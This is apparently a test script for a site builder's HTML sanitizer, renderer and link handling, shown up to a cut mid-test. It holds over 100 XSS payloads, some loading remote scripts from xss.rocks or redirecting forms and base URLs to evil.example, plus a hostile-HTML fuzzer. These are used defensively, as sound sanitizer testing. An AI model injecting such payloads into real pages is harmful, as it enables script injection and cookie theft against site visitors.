/**
 * Proves the renderer and section kit fixes (spec section 14):
 *
 *   node scripts/prove-builder-kit.cjs
 *
 *  - the prose sanitizer is an allowlist: 100+ filter-evasion vectors (the OWASP list,
 *    the regex bypasses it replaces, mutation XSS) leave no tag outside the allowlist, no
 *    `on…=`, `srcdoc`, `style` or other attribute, and no `javascript:`, `vbscript:` or
 *    `data:` link; editor output round-trips unchanged except `h1` → `h2`; a second pass
 *    changes nothing (also over 2000 seeded random documents), and it stays linear;
 *  - hydration: scalar `media:` refs resolve or leave their slot empty; prose in list rows
 *    is sanitized; every href field (top level, groups, rows, children) goes through
 *    sectionHref under a link base and is untouched without one;
 *  - icons: only real icon components resolve (not `createLucideIcon`, `icons`, `Icon`,
 *    `toString`, `__proto__`); `House` and the alias `CheckCircle2` do;
 *  - rendering: a placed testimonial shows no sample role or company, a split hero with an
 *    explicit `backdrop` draws only the tiles it has, its photo carries `alt={mediaLabel}`,
 *    every hero carries the trim variables, callout and prose link styles;
 *  - CSS: block keys and values built to break out of the stylesheet produce no `<`;
 *    `backgroundCss` writes nothing for a foreign scope; inverse and brand bands declare
 *    their tokens before their surface, once per scheme; `--radius` per shape; the hover
 *    fill mixes toward black on light themes; blocks clip with `overflow: clip`, the footer
 *    with `hidden`; the header paints its layer; and three looks saved before any of this
 *    render exactly as they did, apart from the added variables;
 *  - site-doc: a PATCH body's look is stored sanitized; media entries take width/height.
 */
const assert = require('node:assert/strict')
const crypto = require('node:crypto')
const { loadTs, rootRequire } = require('./lib/load-ts.cjs')
const React = rootRequire('react')
const { renderToStaticMarkup } = rootRequire('react-dom/server')

const { sanitizeProseHtml, isProseHtml } = loadTs('src/lib/builder/prose-html.ts')
const { hydrateProps } = loadTs('src/lib/builder/hydrate.ts')
const { RenderBlocks } = loadTs('src/lib/builder/render.tsx')
const { resolveIcon } = loadTs('src/lib/builder/icons.ts')
const { setMediaIndex } = loadTs('src/lib/builder/media-store.ts')
const { sectionSchemas } = loadTs('src/lib/builder/schema.ts')
const { sectionHref } = loadTs('src/lib/builder/links.ts')
const { sanitizeLook, defaultLook } = loadTs('src/lib/builder/look.ts')
const { themeCss, backgroundCss, lookCss } = loadTs('src/app/section-preview/theme.ts')
const { defaultSettings } = loadTs('src/app/builder/theme-settings.ts')
const { defaultBackground, globalBackground } = loadTs('src/app/builder/background-settings.ts')
const { googleFonts, fontStack } = loadTs('src/app/builder/google-fonts.ts')
const { deriveScheme, schemeStrong } = loadTs('src/lib/builder/design/scheme.ts')
const { sitePatchSchema, mediaEntrySchema } = loadTs('src/lib/builder/site-doc.ts')
const lucide = rootRequire('lucide-react')

let failed = 0
const check = (name, fn) => {
	try {
		fn()
		console.log(`PASS ${name}`)
	} catch (error) {
		failed++
		console.log(`FAIL ${name}: ${String(error.message).split('\n')[0]}`)
	}
}

const clone = (value) => JSON.parse(JSON.stringify(value))

// ---- the sanitizer -------------------------------------------------------------

const ALLOWED_TAGS = new Set(['p', 'h2', 'h3', 'h4', 'h5', 'h6', 'strong', 'b', 'em', 'i', 'u', 's', 'code', 'pre', 'blockquote', 'ul', 'ol', 'li', 'br', 'hr', 'a'])
const ALLOWED_ATTRIBUTES = { a: new Set(['href', 'target', 'rel']), ol: new Set(['start']) }

/**
 * Every tag the sanitizer wrote, as a browser would read it. Text never holds a raw `<`,
 * so each `<` starts one of these; each must be allowed, with allowed attributes only
 * (so no `on…=`, `srcdoc` or `style`), every value double-quoted and escaped, and no
 * link whose scheme is not web, mail or phone. A value is only ever read as a URL from
 * its start, so `/search?q=javascript:` is a harmless page link.
 */
function unsafeParts(html) {
	const problems = []
	const tag = /<(\/?)([^\s/>]+)([^>]*)>/g
	let match
	let consumed = 0
	while ((match = tag.exec(html)) !== null) {
		if (html.slice(consumed, match.index).includes('<')) problems.push('stray <')
		consumed = match.index + match[0].length
		const name = match[2].toLowerCase()
		if (!ALLOWED_TAGS.has(name)) problems.push(`tag <${name}>`)
		const attrs = [...match[3].matchAll(/ ([a-z]+)="([^"<>]*)"/g)]
		const rest = match[3].replace(/ ([a-z]+)="([^"<>]*)"/g, '')
		if (rest) problems.push(`unparsed attribute text ${rest}`)
		if (match[1] && match[3]) problems.push('attributes on a closing tag')
		for (const [, key, value] of attrs) {
			if (!ALLOWED_ATTRIBUTES[name]?.has(key)) problems.push(`attribute ${key} on <${name}>`)
			const decoded = value.replace(/&quot;/g, '"').replace(/&lt;/g, '<').replace(/&gt;/g, '>').replace(/&amp;/g, '&')
			if (key === 'href' && /^[a-z][a-z0-9+.-]*:/i.test(decoded) && !/^(https?|mailto|tel):/i.test(decoded)) problems.push(`href ${decoded}`)
			if (key === 'href' && /[\u0000- \u007f-\u009f\s]/.test(decoded)) problems.push(`href with spaces or controls ${decoded}`)
		}
	}
	if (html.slice(consumed).includes('<')) problems.push('stray <')
	for (const marker of ['<script', '<svg', '<iframe', '<style', '<base', '<form', '<img', '<object', '<embed', '<math', '<meta', '<link', '<input', '<template', '<frame', '<video', '<source'])
		if (html.toLowerCase().includes(marker)) problems.push(marker)
	return problems
}

// The OWASP filter-evasion cheat sheet, the bypasses of the regex sanitizer this replaced
// (spec 14.1 #3), and the classic mutation-XSS shapes.
const VECTORS = [
	`<SCRIPT SRC=https://cdn.jsdelivr.net/gh/Moksh45/host-xss.rocks/index.js></SCRIPT>`,
	`javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>`,
	`<IMG SRC="javascript:alert('XSS');">`,
	`<IMG SRC=javascript:alert('XSS')>`,
	`<IMG SRC=JaVaScRiPt:alert('XSS')>`,
	'<IMG SRC=`javascript:alert("RSnake says, \'XSS\'")`>',
	`<a onmouseover="alert(document.cookie)">xxs link</a>`,
	`<a onmouseover=alert(document.cookie)>xxs link</a>`,
	`<IMG """><SCRIPT>alert("XSS")</SCRIPT>"\\>`,
	`<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>`,
	`<IMG SRC=# onmouseover="alert('xxs')">`,
	`<IMG SRC= onmouseover="alert('xxs')">`,
	`<IMG onmouseover="alert('xxs')">`,
	`<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>`,
	`<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">`,
	`<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>`,
	`<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">x</a>`,
	`<a href="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">x</a>`,
	`<a href="&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29">x</a>`,
	`<a href="jav	ascript:alert('XSS');">x</a>`,
	`<a href="jav&#x09;ascript:alert('XSS');">x</a>`,
	`<a href="jav&#x0A;ascript:alert('XSS');">x</a>`,
	`<a href="jav&#x0D;ascript:alert('XSS');">x</a>`,
	`<a href=" &#14;  javascript:alert('XSS');">x</a>`,
	`<SCRIPT/XSS SRC="http://xss.rocks/xss.js"></SCRIPT>`,
	'<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert("XSS")>',
	`<SCRIPT/SRC="http://xss.rocks/xss.js"></SCRIPT>`,
	`<<SCRIPT>alert("XSS");//\\<</SCRIPT>`,
	`<SCRIPT SRC=http://xss.rocks/xss.js?< B >`,
	`<SCRIPT SRC=//xss.rocks/.j>`,
	`<IMG SRC="\`<javascript:alert>\`('XSS')"`,
	`<iframe src=http://xss.rocks/scriptlet.html <`,
	`\\";alert('XSS');//`,
	`</TITLE><SCRIPT>alert("XSS");</SCRIPT>`,
	`<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">`,
	`<BODY BACKGROUND="javascript:alert('XSS')">`,
	`<IMG DYNSRC="javascript:alert('XSS')">`,
	`<IMG LOWSRC="javascript:alert('XSS')">`,
	`<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS</br>`,
	`<IMG SRC='vbscript:msgbox("XSS")'>`,
	`<svg/onload=alert('XSS')>`,
	`<BODY ONLOAD=alert('XSS')>`,
	`<BGSOUND SRC="javascript:alert('XSS');">`,
	`<BR SIZE="&{alert('XSS')}">`,
	`<LINK REL="stylesheet" HREF="javascript:alert('XSS');">`,
	`<STYLE>@import'http://xss.rocks/xss.css';</STYLE>`,
	`<META HTTP-EQUIV="Link" Content="<http://xss.rocks/xss.css>; REL=stylesheet">`,
	`<STYLE>BODY{-moz-binding:url("http://xss.rocks/xssmoz.xml#xss")}</STYLE>`,
	`<STYLE>@im\\port'\\ja\\vasc\\ript:alert("XSS")';</STYLE>`,
	`<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">`,
	`exp/*<A STYLE='no\\xss:noxss("*//*");xss:ex/*XSS*//*/*/pression(alert("XSS"))'>`,
	`<STYLE TYPE="text/javascript">alert('XSS');</STYLE>`,
	`<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>`,
	`<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>`,
	`<XSS STYLE="xss:expression(alert('XSS'))">`,
	`<XSS STYLE="behavior: url(xss.htc);">`,
	`<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">`,
	`<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">`,
	`<IFRAME SRC="javascript:alert('XSS');"></IFRAME>`,
	`<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>`,
	`<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>`,
	`<TABLE BACKGROUND="javascript:alert('XSS')">`,
	`<TABLE><TD BACKGROUND="javascript:alert('XSS')">`,
	`<DIV STYLE="background-image: url(javascript:alert('XSS'))">`,
	`<DIV STYLE="background-image:\\0075\\0072\\006C\\0028'\\006a\\0061\\0076\\0061\\0073\\0063\\0072\\0069\\0070\\0074\\003a\\0061\\006c\\0065\\0072\\0074\\0028.1027\\0058.1053\\0053\\0027\\0029'\\0029">`,
	`<DIV STYLE="width: expression(alert('XSS'));">`,
	`<BASE HREF="javascript:alert('XSS');//">`,
	`<OBJECT TYPE="text/x-scriptlet" DATA="http://xss.rocks/scriptlet.html"></OBJECT>`,
	`<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv" type="image/svg+xml" AllowScriptAccess="always"></EMBED>`,
	`<SCRIPT a=">" SRC="httx://xss.rocks/xss.js"></SCRIPT>`,
	`<SCRIPT =">" SRC="httx://xss.rocks/xss.js"></SCRIPT>`,
	`<SCRIPT a=">" '' SRC="httx://xss.rocks/xss.js"></SCRIPT>`,
	`<SCRIPT "a='>'" SRC="httx://xss.rocks/xss.js"></SCRIPT>`,
	'<SCRIPT a=`>` SRC="httx://xss.rocks/xss.js"></SCRIPT>',
	`<SCRIPT a=">'>" SRC="httx://xss.rocks/xss.js"></SCRIPT>`,
	`<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="httx://xss.rocks/xss.js"></SCRIPT>`,
	`<A HREF="javascript:document.location='http://www.google.com/'">XSS</A>`,
	`<IMG SRC=x onerror=alert(1)//`,
	`<a href="javas\u0000cript:alert(1)">nul</a>`,
	`<!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]-->`,
	`<? echo('<SCR)'; echo('IPT>alert("XSS")</SCRIPT>'); ?>`,
	`<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-`,
	// The regex sanitizer's bypasses.
	`<svg/onload=alert(1)>`,
	`<img/src=x/onerror=alert(1)>`,
	`<a href=javascript:alert(1)>x</a>`,
	`<a href="jav&#x61;script:alert(1)">x</a>`,
	`<base href="https://evil.example/"><p>x</p>`,
	`<form action="https://evil.example"><button>Go</button></form>`,
	`<p onclick=alert(1)>x</p>`,
	`<a href="javascript&colon;alert(1)">x</a>`,
	`<a href="java&Tab;script:alert(1)">x</a>`,
	`<a href="java&NewLine;script:alert(1)">x</a>`,
	`<a href="\u0001javascript:alert(1)">x</a>`,
	`<a href="  javascript:alert(1)">x</a>`,
	`<a href=" j a v a s c r i p t:alert(1)">x</a>`,
	`<a href="JaVaScRiPt:alert(1)">x</a>`,
	`<a href="&#x6a;avascript:alert(1)">x</a>`,
	`<a href="jav&#97;script:alert(1)">x</a>`,
	`<a href=javascript&#58;alert(1)>x</a>`,
	`<a href="vbscript:msgbox(1)">x</a>`,
	`<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>`,
	`<a href="https://ok.example" onclick="alert(1)" target="_self" style="color:red">x</a>`,
	`<p style="background:url(javascript:alert(1))" class="x" id="y" data-x="1">x</p>`,
	// Mutation XSS: markup that a browser re-parses into something else.
	`<noscript><p title="</noscript><img src=x onerror=alert(1)>">`,
	`<svg></p><style><a id="</style><img src=1 onerror=alert(1)>">`,
	`<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=1 onerror=alert(1)&gt;">`,
	`<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>`,
	`<template><script>alert(1)</script></template>`,
	`<iframe srcdoc="<script>alert(1)</script>"></iframe>`,
	`<p srcdoc="x" onclick="alert(1)">text</p>`,
	`<details open ontoggle=alert(1)>`,
	`<video><source onerror="alert(1)">`,
	`<object data="javascript:alert(1)">`,
	`<isindex type=image src=1 onerror=alert(1)>`,
	`<xmp><p title="</xmp><img src=x onerror=alert(1)>">`,
	`<select><template><style><!--</style><a rel="--></style></template></select><img src=x onerror=alert(1)>">`,
	`<textarea></textarea><script>alert(1)</script>`,
	`<title><img src=x onerror=alert(1)></title>`,
	`<!--<img src=x onerror=alert(1)>-->`,
	`<!--> <img src=x onerror=alert(1)> -->`,
	`"><script>alert(1)</script>`,
	`<ScRiPt>alert(1)</sCrIpT>`,
	`<scr<script>ipt>alert(1)</script>`,
	`<a href="javascript:alert(1)"`,
	`<plaintext><img src=x onerror=alert(1)>`,
	`<p>ok</p><script>alert(1)</script><p>after</p>`,
	`<a href="/a">one<a href="javascript:alert(1)">two</a></a>`,
	`<ul><li><a href="#" onmouseover="alert(1)">x</a></li></ul>`,
	`<p title="x" onmouseover="alert(1)//">x</p>`,
	`<svg><script>alert(1)</script></svg><p>kept</p>`,
	`<math><a xlink:href="javascript:alert(1)">x</a></math>`,
	`<embed src="javascript:alert(1)"><p>after the embed</p>`,
]

check(`sanitizer: ${VECTORS.length} XSS vectors leave nothing unsafe`, () => {
	assert.ok(VECTORS.length >= 80, 'at least 80 vectors')
	for (const vector of VECTORS) {
		const out = sanitizeProseHtml(vector)
		const problems = unsafeParts(out)
		assert.deepEqual(problems, [], `${vector.slice(0, 60)} → ${out.slice(0, 80)}`)
		assert.equal(sanitizeProseHtml(out), out, `idempotent: ${vector.slice(0, 60)}`)
	}
})

check('sanitizer: content of dropped elements is gone, the rest is kept', () => {
	assert.equal(sanitizeProseHtml('<p>ok</p><script>alert(1)</script><p>after</p>'), '<p>ok</p><p>after</p>')
	assert.equal(sanitizeProseHtml('<svg><script>alert(1)</script></svg><p>kept</p>'), '<p>kept</p>')
	assert.equal(sanitizeProseHtml('<embed src="javascript:alert(1)"><p>after the embed</p>'), '<p>after the embed</p>')
	assert.equal(sanitizeProseHtml('<form action="x"><button>Go</button></form>'), 'Go')
	assert.equal(sanitizeProseHtml('<div><span class="x">text</span></div>'), 'text')
	assert.equal(sanitizeProseHtml('<a href="https://ok.example" onclick="alert(1)" target="_self">x</a>'), '<a href="https://ok.example">x</a>')
})

// What the builder's editor (tiptap 3 StarterKit) writes.
const EDITOR_SAMPLES = [
	'<p>Plain paragraph with <strong>bold</strong>, <em>italic</em>, <s>struck</s>, <u>underlined</u> and <code>inline code</code>.</p>',
	'<h2>Heading two</h2><h3>Heading three</h3><h4>Heading four</h4><h5>Heading five</h5><h6>Heading six</h6>',
	'<ul><li><p>First</p></li><li><p>Second with <a target="_blank" rel="noopener noreferrer nofollow" href="https://example.com/a?b=1&amp;c=2">a link</a></p></li></ul>',
	'<ol start="3"><li><p>Three</p></li><li><p>Four</p><ul><li><p>Nested</p></li></ul></li></ol>',
	'<blockquote><p>A quote &amp; a &lt;tag&gt; written as text.</p></blockquote><hr><p>After the rule<br>and a line break.</p>',
	'<pre><code>const a = 1 &lt; 2 &amp;&amp; b &gt; 0</code></pre><p></p>',
	'<p>Non-breaking&nbsp;space, “curly quotes” — dashes, émigré, 日本語, 5 &gt; 3 and "straight" \'quotes\'.</p>',
	'<p><a target="_blank" rel="noopener noreferrer nofollow" href="mailto:hello@example.com">hello@example.com</a> or <a target="_blank" rel="noopener noreferrer nofollow" href="tel:+15125550142">call</a></p>',
	'<p><strong><em>bold italic</em></strong> and <a target="_blank" rel="noopener noreferrer nofollow" href="/contact">a page link</a></p>',
	'<p>One short paragraph.</p><p>Another, with a <a target="_blank" rel="noopener noreferrer nofollow" href="#faq">jump link</a>.</p>',
]

check('sanitizer: editor output round-trips unchanged; h1 becomes h2', () => {
	for (const sample of EDITOR_SAMPLES) assert.equal(sanitizeProseHtml(sample), sample)
	assert.equal(sanitizeProseHtml('<h1>Pasted title</h1><p>x</p>'), '<h2>Pasted title</h2><p>x</p>')
	assert.equal(sanitizeProseHtml('<H1 class="x">A</h1>'), '<h2>A</h2>')
	for (const sample of EDITOR_SAMPLES) assert.ok(isProseHtml(sanitizeProseHtml(sample)))
})

check('sanitizer: links keep web, mail, phone and page targets only', () => {
	const href = (value) => /href="([^"]*)"/.exec(sanitizeProseHtml(`<a href="${value}">x</a>`))?.[1] ?? null
	assert.equal(href('https://example.com/x'), 'https://example.com/x')
	assert.equal(href('HTTP://example.com'), 'HTTP://example.com')
	assert.equal(href('mailto:a@b.co'), 'mailto:a@b.co')
	assert.equal(href('tel:+1 512 555 0142'), 'tel:+15125550142')
	assert.equal(href('/contact?x=1&amp;y=2#top'), '/contact?x=1&amp;y=2#top')
	assert.equal(href('#faq'), '#faq')
	for (const bad of ['javascript:alert(1)', 'data:text/html,x', 'vbscript:x', 'file:///etc/passwd', 'jav&#x61;script:1', 'java\tscript:1'])
		assert.equal(href(bad), null, bad)
	// A new tab never hands the opener over, and rel keeps only known tokens.
	assert.equal(sanitizeProseHtml('<a href="/x" target="_BLANK">x</a>'), '<a href="/x" target="_blank" rel="noopener noreferrer">x</a>')
	assert.equal(sanitizeProseHtml('<a href="/x" rel="nofollow opener evil">x</a>'), '<a href="/x" rel="nofollow">x</a>')
	assert.equal(sanitizeProseHtml('<a href="/x" target="_top" rel="me">x</a>'), '<a href="/x">x</a>')
	assert.equal(sanitizeProseHtml('<a href="/1" href="javascript:x">x</a>'), '<a href="/1">x</a>', 'the first of a repeated attribute wins')
	assert.equal(sanitizeProseHtml('<ol start="12"><li>x</li></ol><ol start="-1"><li>y</li></ol><ol start="1234567"><li>z</li></ol>'), '<ol start="12"><li>x</li></ol><ol><li>y</li></ol><ol><li>z</li></ol>')
})

check('sanitizer: nesting is balanced so a browser parses it as written', () => {
	assert.equal(sanitizeProseHtml('<p>a<ul><li>b<li>c</ul>d'), '<p>a</p><ul><li>b</li><li>c</li></ul>d')
	assert.equal(sanitizeProseHtml('<li>stray</li>after'), '<p>stray</p>after')
	assert.equal(sanitizeProseHtml('<a href="/a">one<a href="/b">two</a></a>'), '<a href="/a">one</a><a href="/b">two</a>')
	assert.equal(sanitizeProseHtml('<p><strong>a<h2>b</h2>'), '<p><strong>a</strong></p><h2>b</h2>')
	assert.equal(sanitizeProseHtml('<h2>a<h3>b</h3>'), '<h2>a</h2><h3>b</h3>')
	assert.equal(sanitizeProseHtml('<h2>a</h3>b'), '<h2>a</h2>b', 'any heading end tag closes the open heading')
	assert.equal(sanitizeProseHtml('<b><i>x</b>y</i>'), '<b><i>x</i></b>y')
	assert.equal(sanitizeProseHtml('</p></strong>text'), 'text')
	assert.equal(sanitizeProseHtml('<p>a<hr>b'), '<p>a</p><hr>b')
	assert.equal(sanitizeProseHtml('<blockquote><p>q'), '<blockquote><p>q</p></blockquote>')
	assert.equal(sanitizeProseHtml('<p>cut <a href="https://x.co/'), '<p>cut &lt;a href="https://x.co/</p>', 'a cut tag stays inert text')
	assert.equal(sanitizeProseHtml('<p>Tom & Jerry &amp; co &lt;3 &copy; &#169; &#xa9; &bogus</p>'), '<p>Tom &amp; Jerry &amp; co &lt;3 &copy; &#169; &#xa9; &amp;bogus</p>')
	assert.equal(sanitizeProseHtml('1 < 2 > 0'), '1 &lt; 2 &gt; 0')
	assert.equal(sanitizeProseHtml('<p>x</p>'.repeat(10), { maxLength: 16 }), '<p>x</p><p>x</p>')
	assert.equal(sanitizeProseHtml(null), '')
	assert.equal(sanitizeProseHtml(42), '42')
})

// A seeded generator of hostile HTML, for idempotence and safety over many documents.
function mulberry32(seed) {
	let a = seed >>> 0
	return () => {
		a = (a + 0x6d2b79f5) >>> 0
		let t = a
		t = Math.imul(t ^ (t >>> 15), t | 1)
		t ^= t + Math.imul(t ^ (t >>> 7), t | 61)
		return ((t ^ (t >>> 14)) >>> 0) / 4294967296
	}
}
const random = mulberry32(20261025)
const pick = (list) => list[Math.floor(random() * list.length)]
const FRAGMENTS = [
	'<p>', '</p>', '<h1>', '</h1>', '<h3>', '</h4>', '<ul>', '</ul>', '<ol start="2">', '<li>', '</li>', '<a href="', '<a href=', '">', "'", '"', '>',
	'<', '</', '<!--', '-->', '<!', '<?', '<script>', '</script>', '<svg>', '</svg>', '<style>', '<img src=x onerror=', 'javascript:', 'jav&#x61;script:',
	'&amp;', '&', '&#', '&#106;', '&lt;', ' ', '\n', '\t', 'text', 'Ünïcode', '<strong>', '</strong>', '<em>', '<br>', '<hr/>', '<pre>', '</pre>',
	'<blockquote>', 'target="_blank"', 'rel="nofollow"', ' onclick="x"', '<textarea>', '</textarea>', '<noscript>', '<b><i>', '</b>', '<a/>', '=',
]

check('sanitizer: 2000 seeded random documents are safe and idempotent', () => {
	for (let n = 0; n < 2000; n++) {
		const input = Array.from({ length: 1 + Math.floor(random() * 40) }, () => pick(FRAGMENTS)).join('')
		const once = sanitizeProseHtml(input)
		assert.deepEqual(unsafeParts(once), [], JSON.stringify(input))
		assert.equal(sanitizeProseHtml(once), once, JSON.stringify(input))
	}
})

check('sanitizer: stays linear on 20 000 hostile characters', () => {
	for (const unit of ['<a <a ', '<p title="', '<!--<', '<<<<', '&#x6a', '<b>', '<ul><li>', '</p>']) {
		const input = unit.repeat(Math.ceil(20000 / unit.length))
		const started = process.hrtime.bigint()
		const out = sanitizeProseHtml(input)
		const ms = Number(process.hrtime.bigint() - started) / 1e6
		assert.ok(ms < 250, `${unit}: ${ms.toFixed(0)} ms`)
		assert.deepEqual(unsafeParts(out), [], unit)
	}
})

// ---- hydration -----------------------------------------------------------------

const IMG_A = '/section-images/eugene-golovesov-U9d2x-SfIG4-unsplash.jpg'
const IMG_B = '/section-images/gabriel-hohenstein-UGzxTdhC254-unsplash.jpg'

check('hydrate: scalar media refs resolve, and an unresolved one leaves its slot empty', () => {
	setMediaIndex([{ id: 'md_a', url: IMG_A }])
	const props = hydrateProps('split-hero', {
		mediaSrc: 'media:md_gone',
		backdrop: ['media:md_a', 'media:md_gone', null, IMG_B, { value: 'media:md_a' }],
	})
	assert.deepEqual(props.backdrop, [IMG_A, '', '', IMG_B, IMG_A])
	assert.equal(props.mediaSrc, undefined)
	assert.ok(!JSON.stringify(props).includes('media:'))
	// Text lists are untouched.
	assert.deepEqual(hydrateProps('chips', { items: ['a', { value: 'b' }] }).items, ['a', 'b'])
	setMediaIndex([])
})

check('hydrate: prose in list rows is sanitized, plain text becomes escaped paragraphs', () => {
	const props = hydrateProps('bento-grid', {
		tiles: [
			{ title: 'A', blurb: 'a', html: '<p>ok</p><script>alert(1)</script><img src=x onerror=alert(1)>' },
			{ title: 'B', blurb: 'b', html: 'Plain <b>text</b> & more\n\nSecond' },
			{ title: 'C', blurb: 'c', html: '<p><svg onload=alert(1)></svg></p><p><a href="javascript:alert(1)">x</a></p>' },
			{ title: 'D', blurb: 'd', html: 42 },
		],
	})
	assert.equal(props.tiles[0].html, '<p>ok</p>')
	assert.equal(props.tiles[1].html, '<p>Plain &lt;b&gt;text&lt;/b&gt; &amp; more</p><p>Second</p>')
	assert.equal(props.tiles[2].html, '<p></p><p><a>x</a></p>')
	assert.ok(!('html' in props.tiles[3]))
	// The prose block's own body still renders as before.
	assert.equal(hydrateProps('prose-block', { body: '<h1>T</h1><p onclick="x">b</p>' }).html, '<h2>T</h2><p>b</p>')
})

/** Every href field of every section, as [path into the props, field]. */
function hrefPaths() {
	const found = []
	const walk = (type, fields, prefix) => {
		for (const field of fields) {
			const leaf = field.key.slice(field.key.lastIndexOf('.') + 1)
			const path = [...prefix, field.key]
			if (field.type === 'text' && (leaf === 'href' || leaf.endsWith('Href'))) found.push({ type, path })
			if (field.type === 'group') walk(type, field.of ?? [], path)
			if (field.type === 'list' && field.of && !(field.of.length === 1 && field.of[0].key === 'value')) walk(type, field.of, [...path, 0])
		}
	}
	for (const schema of sectionSchemas) walk(schema.type, schema.fields, [])
	return found
}

const setIn = (target, path, value) => {
	let node = target
	path.slice(0, -1).forEach((key, i) => {
		node[key] ??= typeof path[i + 1] === 'number' ? [] : {}
		node = node[key]
	})
	node[path[path.length - 1]] = value
}
const getIn = (target, path) => path.reduce((node, key) => node?.[key], target)

check('hydrate: every href field goes through sectionHref under a link base, and only then', () => {
	const paths = hrefPaths()
	assert.ok(paths.length >= 15, `found ${paths.length} href fields`)
	const stored = ['/', '/contact', 'contact', 'https://example.com/x', 'tel:+15125550142', 'mailto:a@b.co', '#faq', 'javascript:alert(1)']
	for (const { type, path } of paths)
		for (const href of stored) {
			const props = {}
			setIn(props, path, href)
			for (const linkBase of ['', '/preview/abc', '/p/tok'])
				assert.equal(getIn(hydrateProps(type, props, { linkBase }), path), sectionHref(linkBase, href), `${type} ${path.join('.')} ${href} under '${linkBase}'`)
			assert.equal(getIn(hydrateProps(type, props), path), href, `${type} ${path.join('.')} untouched without a link base`)
		}
})

check('render: links inside sections and their children follow the link base', () => {
	const blocks = [
		{ id: 'b1', type: 'cta-band', props: { title: 'T', description: 'D', actions: [{ label: 'Call', href: 'tel:+15125550142' }, { label: 'Contact', href: '/contact' }] } },
		{ id: 'b2', type: 'grid', props: { columns: '2' }, children: [{ id: 'c1', type: 'case-study-card', props: { name: 'N', category: 'C', client: 'K', summary: 'S', href: '/work' } }] },
	]
	const html = renderToStaticMarkup(React.createElement(RenderBlocks, { blocks, linkBase: '/p/tok' }))
	assert.ok(html.includes('href="/p/tok/contact"'), 'section button')
	assert.ok(html.includes('href="tel:+15125550142"'), 'phone kept')
	assert.ok(html.includes('href="/p/tok/work"'), 'child card')
	const bare = renderToStaticMarkup(React.createElement(RenderBlocks, { blocks }))
	assert.ok(bare.includes('href="/contact"') && bare.includes('href="/work"'), 'no link base: as stored')
})

// ---- icons ---------------------------------------------------------------------

check('icons: only real icon components resolve', () => {
	for (const name of ['createLucideIcon', 'icons', 'Icon', 'toString', '__proto__', 'constructor', 'hasOwnProperty', '', 'house', 'House ', null, undefined, 42, {}])
		assert.equal(resolveIcon(name), undefined, String(name))
	assert.equal(resolveIcon('House'), lucide.House)
	assert.equal(resolveIcon('CheckCircle2'), lucide.CircleCheck, 'a deprecated alias still renders')
	assert.equal(resolveIcon('HouseIcon'), lucide.House, 'the Icon-suffixed alias')
})

// ---- rendering -----------------------------------------------------------------

const render = (type, props, variant) =>
	renderToStaticMarkup(React.createElement(RenderBlocks, { blocks: [{ id: 'x1', type, ...(variant ? { variant } : {}), props }] }))

check('render: a placed testimonial shows no sample role or company', () => {
	for (const variant of ['card', 'bare', 'aside']) {
		const html = render('testimonial-card', { quote: 'Fixed our roof fast.', name: 'Dana R.' }, variant)
		assert.ok(html.includes('Dana R.') && html.includes('Fixed our roof fast.'), variant)
		assert.ok(!html.includes('Role Or Title') && !html.includes('Company Name'), variant)
	}
	const withRole = render('testimonial-card', { quote: 'Q', name: 'N', role: 'Homeowner' }, 'bare')
	assert.ok(withRole.includes('Homeowner') && !withRole.includes('·'), 'one part, no separator')
	const both = render('testimonial-card', { quote: 'Q', name: 'N', role: 'Owner', company: 'Acme Bakery' }, 'bare')
	assert.ok(both.includes('Owner · Acme Bakery'), 'joined with a middle dot')
	// The library's untouched card keeps its sample.
	const sample = render('testimonial-card', {})
	assert.ok(sample.includes('Role Or Title') && sample.includes('Company Name'))
})

check('render: the split hero draws only the backdrop tiles it was given', () => {
	const empty = render('split-hero', { backdrop: [] })
	assert.ok(!/Image \d/.test(empty), 'an empty list draws no fan')
	const one = render('split-hero', { backdrop: [IMG_A] })
	assert.ok(!/Image \d/.test(one), 'no placeholder beside a real tile')
